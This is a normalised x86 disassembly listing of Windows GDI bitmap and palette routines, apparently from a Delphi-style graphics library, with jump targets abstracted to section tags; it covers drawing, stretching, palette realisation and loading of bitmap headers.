mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_42168c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41ecf8
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_420be4
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_4216f4
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax esi
call sub_421e04
mov eax [ esi + 0x28 ]
call sub_420be8
mov eax [ esi + 0x2c ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414004
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_421730
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4217e8
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402cac
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4220d4
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_420be4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_420be8
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414030
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_421820
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_421e04
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4218af
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_42141c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_420db8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4220d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4218b4
mov eax [ ebp - 0x8 ]
call sub_41b998
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a44
call sub_403a98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_4218e0
push ebx
mov ebx eax
mov eax ebx
call sub_421bd4
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40cdfc
pop ebx
retn
sub_421910
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_415750
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_421e04
lea eax [ ebx + 0x2c ]
call sub_40cdfc
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4220d4
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_421984
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d854
mov eax ebx
call sub_421f14
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_421d10
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_421bc0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41d780
push eax
call SetStretchBltMode
mov eax ebx
call sub_421c54
mov dl [ r-xdata ]
call sub_41d854
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_421eb4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_421c54
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421bc7
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_421b55
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41db78
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_421c54
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41dd1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_421bd4
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_421e14
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_421820
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41dad0
sub_421c54
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_421e14
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4209f0
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_4218e0
sub_421c9c
push ebx
mov ebx eax
mov eax ebx
call sub_421e04
mov eax ebx
call sub_421e14
mov edx ebx
mov eax ebx
call sub_4218e0
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_421cc0
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_421d40
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41c268
mov eax ebx
call sub_421d10
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_421c54
xor edx edx
pop ecx
call sub_41d6e8
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_421d90
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_421f14
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_420db8
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_421e14
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_4156ec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_421e97
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_421eb4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_421e04
mov eax ebx
call sub_421e14
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_421d40
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_421480
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_420974
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_421f14
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41e268
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_420974
push 0x0
call GetDC
call sub_41db78
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_421fcc
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41da40
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_421820
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_421e04
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402cac
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_422050
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_4156cc
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_422764
pop esi
pop ebx
retn
sub_422074
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push ecx
push 0x2
mov eax [ r-xdata ]
mov cl 0x1
xchg edx ecx
call sub_415f5c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4220c8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4221fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4220cf
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_4220d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42215b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403440
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4221bb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_420be8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_420be4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4221c2
push rw-data
call LeaveCriticalSection
retn
sub_4221d4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_422764
pop edx
pop edi
pop esi
pop ebx
retn
sub_4221fc
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026bc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_422719
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4226ec
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402cac
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41da58
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_415968
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402cac
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4158f8
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41dce8
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41dd08
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_4158f8
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41db78
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_422667
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41dfb0
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026bc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4225cf
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4158f8
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41db78
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4225a3
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e268
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40c8a0
call sub_41da58
jmp r-xdata
xor eax eax
push ebp
push sub_422636
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4158f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4225aa
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42266e
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40c8a0
call sub_41da58
jmp r-xdata
sub_4225aa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_42266e
